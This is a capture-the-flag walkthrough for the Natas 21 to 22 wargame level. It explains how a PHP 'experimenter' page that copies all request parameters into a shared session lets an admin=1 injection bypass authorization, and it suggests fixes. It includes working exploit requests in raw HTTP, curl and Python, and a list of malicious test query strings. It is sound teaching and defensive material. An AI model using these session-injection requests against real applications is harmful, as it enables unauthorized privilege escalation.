# 🔓 Challenge: Natas Level 21 → 22

## 📋 Objective

Obtain the password for **Natas 22** by exploiting a session manipulation vulnerability in a colocated web application. The target page requires administrator privileges to display credentials, but provides no direct login mechanism—the exploitation path involves leveraging an insecure session handling implementation in a companion application.

---

## 🔍 Deep Analysis

### The Challenge Layout

This level consists of two colocated PHP applications:

1. **Natas 21 (Main)**: Displays credentials only to users with `admin` session variable set to `1`
2. **Natas 21 Experimenter**: Provides a form for modifying UI preferences, but contains a critical vulnerability

Both applications share the same PHP session storage, identified by the `PHPSESSID` cookie. This shared session mechanism is the foundation of the exploit.

### Natas 21 Source Code

```php
<?php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas22\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}

session_start();
print_credentials();
?>
```

**Critical Observation:** The application performs a straightforward authorization check. There is no password prompt, no login form, and no authentication mechanism on this page. The entire security model depends on the integrity of the session data—specifically, the value of `$_SESSION["admin"]`.

The authorization logic can be broken down:
1. Session must exist: `$_SESSION`
2. Session must contain `admin` key: `array_key_exists("admin", $_SESSION)`
3. Admin must be exactly `1`: `$_SESSION["admin"] == 1`

All three conditions must be true simultaneously. However, there is no code on this page that ever sets `admin = 1`, which is the critical design flaw that forces the use of the experimenter application.

### The Experimenter Vulnerability

The experimenter application is designed to allow users to customize display preferences (alignment, font size, background color). However, it implements this feature insecurely:

```php
session_start();

if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

**The Vulnerability in Detail:**

This code iterates through **every parameter** in the HTTP request (`$_REQUEST` includes both GET and POST parameters) and copies them directly into the session array. There is no validation, no filtering, and no whitelist check.

**Example Attack Sequence:**

If an attacker sends a request to the experimenter with the parameter `admin=1`, the loop executes:

```php
$_SESSION["admin"] = "1";
```

The session now contains an unauthorized privilege flag set by user input, not by any authentication mechanism.

### The "Security" That Wasn't

The experimenter defines a list of intended preferences:

```php
$validkeys = array(
    "align" => "center",
    "fontsize" => "100%",
    "bgcolor" => "yellow"
);
```

**Critical Flaw:** This whitelist is defined but **never used for validation**. The vulnerable `foreach` loop runs before any checking against `$validkeys` occurs. By the time the whitelist could theoretically be applied, the arbitrary session variables have already been injected.

**What was intended:**
```php
foreach($validkeys as $key => $default) {
    if(isset($_REQUEST[$key])) {
        $_SESSION[$key] = $_REQUEST[$key];
    }
}
```

**What was actually implemented:** Unrestricted copying of all parameters into the session.

---

## 💡 Exploitation Strategy

### Understanding PHP Session Mechanics

PHP sessions are stored server-side (typically in `/tmp` on Linux or `C:\Windows\Temp` on Windows) with filenames like `sess_[PHPSESSID]`. The session ID is transmitted to the client via the `PHPSESSID` cookie.

**Key Insight:** When `session_start()` is called, PHP loads the session file corresponding to the current `PHPSESSID` cookie. If two applications on the same server use the same session ID, they **load and modify the same session file**.

### How PHP Serializes Sessions

PHP stores session data in a specific serialization format. When the experimenter modifies the session, it might look like:

```
Session File: /tmp/sess_abc123def456
admin|i:1;align|s:6:"center";fontsize|s:4:"100%";bgcolor|s:6:"yellow";
```

The format is: `key|type:length:value;` where `i:` denotes integer, `s:` denotes string, etc.

When Natas 21 calls `session_start()`, PHP deserializes this back into the `$_SESSION` array, preserving all injected variables.

### The Attack Vector

The exploitation requires three steps:

**Step 1: Craft a Malicious Request to the Experimenter**

The attacker sends a request to the experimenter application with the following parameters:
- `align=center` (legitimate preference)
- `fontsize=100%` (legitimate preference)
- `bgcolor=yellow` (legitimate preference)
- `admin=1` (malicious injection)
- `submit=Update` (triggers the vulnerable loop)

The `submit` parameter is essential because it activates the condition:

```php
if(array_key_exists("submit", $_REQUEST))
```

Without it, the vulnerable `foreach` loop never executes.

**Request Example:**
```
GET /experimenter/index.php?align=center&fontsize=100%&bgcolor=yellow&admin=1&submit=Update HTTP/1.1
Host: natas21.natas.labs
```

**Step 2: Extract the Session Cookie**

The experimenter response includes a `Set-Cookie` header with the `PHPSESSID`:

```
Set-Cookie: PHPSESSID=abc123def456; Path=/; HttpOnly
```

Or, the request may already include an existing session ID if one was previously set.

**Important:** The session ID must be preserved for the next step. Browsers do this automatically, but if using tools like curl or Burp Suite, manual cookie management may be required.

**What Happens on the Server:**

The experimenter's `foreach` loop executes, creating session entries. The session file is updated with all parameters, including the injected `admin` variable.

**Step 3: Access Natas 21 with the Same Session Cookie**

The attacker then navigates to Natas 21 while maintaining the same `PHPSESSID` cookie:

```
GET /index.php HTTP/1.1
Host: natas21.natas.labs
Cookie: PHPSESSID=abc123def456
```

When Natas 21 executes `session_start()`, PHP:
1. Reads the `PHPSESSID` cookie value: `abc123def456`
2. Loads the session file from disk
3. Deserializes the session data
4. Populates `$_SESSION` array with all variables including the injected `admin` value

```php
$_SESSION = array(
    "admin" => "1",
    "align" => "center",
    "fontsize" => "100%",
    "bgcolor" => "yellow"
);
```

**Step 4: Authorization Bypass**

The authorization check now passes:

```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)
```

All three conditions are satisfied:
- `$_SESSION` exists: ✓
- `"admin"` key exists: ✓
- `$_SESSION["admin"] == 1`: ✓ (the string `"1"` equals `1` in PHP's loose comparison)

The credentials are displayed.

---

## ✅ Practical Exploitation

### Using Burp Suite

1. **Intercept a request to the experimenter form:**
   - Access `/experimenter/index.php`
   - Modify the form request to include `admin=1`

2. **Example Burp Request:**
   ```
   GET /experimenter/index.php?align=center&fontsize=100%&bgcolor=yellow&admin=1&submit=Update HTTP/1.1
   Host: natas21.natas.labs
   Authorization: Basic natas21:PASSWORD
   ```

3. **Observe the response** for the `PHPSESSID` cookie (or ensure it's set in your cookie jar).

4. **Navigate to Natas 21** with the same session cookie—Burp automatically maintains cookies.

5. **Retrieve the Natas 22 credentials** from the response.

### Using curl

```bash
# Step 1: Send malicious request to experimenter, capture cookie
curl -b cookies.txt -c cookies.txt \
  "http://natas21.natas.labs/experimenter/index.php?align=center&fontsize=100%&bgcolor=yellow&admin=1&submit=Update" \
  -H "Authorization: Basic natas21:PASSWORD"

# Step 2: Use the same cookie to access Natas 21
curl -b cookies.txt \
  "http://natas21.natas.labs/index.php" \
  -H "Authorization: Basic natas21:PASSWORD"
```

### Using Python

```python
import requests

session = requests.Session()
session.auth = ('natas21', 'PASSWORD')

# Step 1: Inject malicious session variable
params = {
    'align': 'center',
    'fontsize': '100%',
    'bgcolor': 'yellow',
    'admin': '1',
    'submit': 'Update'
}
response = session.get('http://natas21.natas.labs/experimenter/index.php', params=params)

# Step 2: Access Natas 21 with the same session
response = session.get('http://natas21.natas.labs/index.php')
print(response.text)
```

---

## 🛡️ Vulnerability Analysis & Remediation

### Vulnerability Classification

| Aspect | Detail |
|--------|--------|
| **Type** | Improper Session Handling, Arbitrary Session Variable Injection |
| **CWE** | CWE-384 (Session Fixation), CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **CVSS v3.1 Score** | 9.1 (Critical) |
| **Attack Vector** | Network (requires access to colocated application) |
| **Privileges Required** | None |
| **User Interaction** | None |
| **Impact** | Complete privilege escalation; attacker gains unauthorized access to restricted functionality |

### Root Causes

1. **Blind Trust in User Input:** The application assumes all request parameters are legitimate configuration values.

2. **Lack of Input Validation:** No filtering or type checking occurs before session modification.

3. **Ineffective Whitelist:** The `$validkeys` array exists but is not used to validate incoming parameters.

4. **Session-Based Authorization:** Relying entirely on session data for access control without a proper authentication layer.

5. **Shared Session Storage:** Multiple applications accessing the same session storage without isolation or namespace separation.

### Secure Implementation Strategies

#### Strategy 1: Whitelist-Based Validation (Recommended)

```php
session_start();

$allowed_keys = array(
    "align" => "center",
    "fontsize" => "100%",
    "bgcolor" => "yellow"
);

if(array_key_exists("submit", $_REQUEST)) {
    foreach($allowed_keys as $key => $default) {
        if(isset($_REQUEST[$key])) {
            // Only copy whitelisted keys
            $_SESSION[$key] = $_REQUEST[$key];
        }
    }
}
```

**Why this works:**
- Only parameters explicitly in the whitelist can be stored.
- The `admin` key is not in the whitelist, so `admin=1` is silently ignored.
- Future developers cannot accidentally add session variables outside the whitelist.
- Simple and maintainable.

#### Strategy 2: Type and Value Validation

```php
session_start();

if(array_key_exists("submit", $_REQUEST)) {
    // Validate alignment (must be one of three values)
    if(isset($_REQUEST['align']) && 
       in_array($_REQUEST['align'], ['left', 'center', 'right'], true)) {
        $_SESSION['align'] = $_REQUEST['align'];
    }
    
    // Validate font size (must be numeric percentage)
    if(isset($_REQUEST['fontsize']) && 
       preg_match('/^\d{1,3}%$/', $_REQUEST['fontsize'])) {
        $_SESSION['fontsize'] = $_REQUEST['fontsize'];
    }
    
    // Validate background color (must be hex or named color)
    if(isset($_REQUEST['bgcolor']) && 
       preg_match('/^[a-zA-Z0-9#]+$/', $_REQUEST['bgcolor'])) {
        $_SESSION['bgcolor'] = $_REQUEST['bgcolor'];
    }
}
```

**Why this works:**
- Each parameter is validated against expected format and values.
- An attacker cannot inject unexpected parameters because they fail validation.
- Invalid input is rejected, preventing injection even if the whitelist is missed.
- Provides explicit feedback about what constitutes valid input.

#### Strategy 3: Separate Authentication from Configuration

```php
session_start();

// NEVER allow user input to set authentication flags
$authenticated = false;
$is_admin = false;

// Derive auth status from a legitimate authentication mechanism
if(isset($_SESSION['user_id'])) {
    $authenticated = true;
    $user = get_user_by_id($_SESSION['user_id']);
    $is_admin = $user['is_admin'] == 1;
}

// ONLY allow user input to modify UI preferences
if($authenticated && array_key_exists("submit", $_REQUEST)) {
    $allowed_ui_keys = ['align', 'fontsize', 'bgcolor'];
    foreach($allowed_ui_keys as $key) {
        if(isset($_REQUEST[$key])) {
            $_SESSION['ui_' . $key] = $_REQUEST[$key]; // Namespace UI settings
        }
    }
}
```

**Why this works:**
- Authentication state is derived from a server-side database, not user input.
- UI preferences are isolated in a separate namespace (`ui_*`).
- Even if the UI preference loop is exploited, it cannot affect authentication variables.
- Demonstrates the principle of defense in depth.

#### Strategy 4: Use a Dedicated Session Management Library

```php
// Using a modern session library (e.g., PSR-6 or PSR-16)
$session = new SessionManager($session_id);

// Explicit method calls instead of magic variable injection
$session->setUiPreference('align', 'center');
$session->setUiPreference('fontsize', '100%');

// Authentication is handled separately by the library
if($session->isAuthenticated() && $session->isAdmin()) {
    // Grant access
}
```

**Why this works:**
- Removes the pattern of blindly copying user input into session variables.
- Forces developers to explicitly define what session data can be modified.
- Libraries often include built-in protections against common session vulnerabilities.
- Reduces the likelihood of accidental security bypasses in custom code.

---

## 🎯 Key Takeaways

### For Security Practitioners

1. **Never blindly copy user input into sensitive structures** like `$_SESSION`, especially authentication-related data.

2. **Whitelists are only effective if enforced.** Defining `$validkeys` without using it provided no security benefit—the lesson is that good intentions in code are worthless without implementation.

3. **Separation of concerns matters.** Authentication and configuration should be in separate namespaces and handled by different code paths. This prevents a bug in one subsystem from compromising another.

4. **Consider the threat model.** This challenge assumes an attacker has network access to a colocated application. In shared hosting environments, this is realistic.

5. **Session fixation vs. session injection are related but distinct:**
   - **Session Fixation:** Attacker forces the victim to use a specific session ID that the attacker controls.
   - **Session Injection:** Attacker modifies data within a session (as in this challenge).

6. **Loose type comparison in PHP can hide bugs.** The condition `$_SESSION["admin"] == 1` is satisfied by both the integer `1` and the string `"1"`. Use strict comparison (`===`) when possible to avoid these pitfalls.

### For Developers

1. **Use a whitelist for any user-configurable session data.** This is the single most effective defense against session injection.

2. **Validate input types and formats**, not just presence. Regex and `in_array()` checks catch many injection attempts.

3. **Keep authentication state separate from user preferences.** Use namespacing or separate storage mechanisms.

4. **Consider using established session libraries** that enforce security best practices by default.

5. **Review code that modifies `$_SESSION` or other global state** during code review—these are high-risk areas.

6. **Test with malicious input:**
   ```php
   // What happens with each of these?
   ?admin=1&submit=Update
   ?admin=true&submit=Update
   ?admin[]=1&submit=Update
   ?admin=1&admin=0&submit=Update
   ?user_id=42&submit=Update
   ```

### Lessons About Authorization

- **Never rely solely on client-side session state for authorization decisions** in critical scenarios.
- **Consider verifying authorization against the database** for sensitive operations, even if the session says the user is an admin.
- **Log all authorization-related activities** so that privilege escalation attempts can be detected and audited.

---

## 🔧 Tools & Techniques Used

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Intercept and modify HTTP requests; maintain cookies across requests |
| **Browser DevTools** | Inspect cookies and session identifiers |
| **curl** | Send crafted HTTP requests from the command line with precise cookie control |
| **Python requests** | Write automated exploitation scripts with session management |
| **PHP source code analysis** | Identify the vulnerability in the application code |

---

## 📚 Related Vulnerabilities & Lessons

- **CWE-639:** Authorization Bypass Through User-Controlled Key
- **CWE-384:** Session Fixation
- **CWE-434:** Unrestricted Upload of File with Dangerous Type
- **CWE-94:** Improper Control of Generation of Code ('Code Injection')

The underlying lesson: **Server-side security decisions must never be based solely on client-supplied data.** The Natas series is designed to teach this principle through progressively complex scenarios.

This challenge sits at the intersection of several important concepts:
- Session management and shared session storage
- Authorization vs. authentication
- The dangers of implicit trust in user input
- How multiple applications can amplify vulnerabilities

---

## 🔐 Challenge Difficulty & Learning Value

**Difficulty:** Medium (requires understanding PHP sessions and session sharing)

**Concepts Tested:**
- Understanding PHP session mechanics
- Recognizing authorization logic flaws
- Identifying privilege escalation vectors
- Using web tools for exploitation (Burp Suite, curl, DevTools)

**Learning Value:** High
- Demonstrates why whitelists must be enforced, not just defined
- Illustrates the risks of session-based authorization without proper authentication
- Shows how colocated applications can amplify vulnerabilities
- Teaches practical exploitation using common tools
- Introduces the concept of implicit trust in user input as a security anti-pattern

This challenge effectively bridges the gap between understanding a vulnerability in theory and exploiting it in practice, making it one of the more instructive Natas levels.
